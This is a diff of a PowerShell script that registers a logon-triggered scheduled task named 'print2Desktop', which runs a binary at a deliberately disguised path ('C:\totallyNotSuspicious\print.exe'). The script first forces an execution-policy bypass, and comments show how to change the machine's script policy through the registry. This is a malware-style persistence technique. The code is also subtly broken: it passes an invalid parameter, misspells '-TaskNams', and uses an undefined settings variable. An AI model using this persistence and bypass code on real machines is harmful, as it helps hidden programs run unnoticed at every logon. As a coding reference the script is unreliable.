@@ -1,23 +1,4 @@
-$A = New-ScheduledTaskAction -Execute 'print.exe'
-$T = New-ScheduledTaskTrigger -AtLogon
-$S = New-ScheduledTaskSettingsSet
-$D= New-ScheduledTask -Action $A -Trigger $T -Settings $S
-
-Register-ScheduledTask T1 -InputObject $D
-
-Set-ExecutionPolicy Bypass -Scope Process -Force;
-
-$A = New-ScheduledTaskAction -ExecutionPolicy Bypass -Execute 'C:\totallyNotSuspicious\print.exe'
-$T = New-ScheduledTaskTrigger -AtLogon
-$P = New-ScheduledTaskPrincipal
-$N = "print2Desktop"
-$D= New-ScheduledTask -Action $A -Trigger $T -Settings $S
-
-Register-ScheduledTask  -InputObject $D -TaskNams $N
-
-#___________________________________________________________________________________________________________________________________________________
-
-#___________________________________________________________________________________________________________________________________________________
+#Bypass execution policy via python exec of powershell
 #Key to change run permission of scripts on local machine
 #HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.Powershell
 #PS-cmd to read Key
@@ -28,4 +9,13 @@ Register-ScheduledTask  -InputObject $D -TaskNams $N
 #$keyValue = "RemoteSigned"
 #Set-ItemProperty -Path 'HKLM:\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.Powershell' -Name $keyName -Value $keyValue
 
-#Bypass execution policy via python exec of powershell
+$whoami=whoami.exe
+Set-ExecutionPolicy Bypass -Scope Process -Force;
+
+$A = New-ScheduledTaskAction -ExecutionPolicy Bypass -Execute 'C:\totallyNotSuspicious\print.exe'
+$T = New-ScheduledTaskTrigger -AtLogon
+$P = New-ScheduledTaskPrincipal $whoami
+$N = "print2Desktop"
+$D= New-ScheduledTask -Action $A -Trigger $T -Settings $S -Principal $P
+
+Register-ScheduledTask  -InputObject $D -TaskNams $N
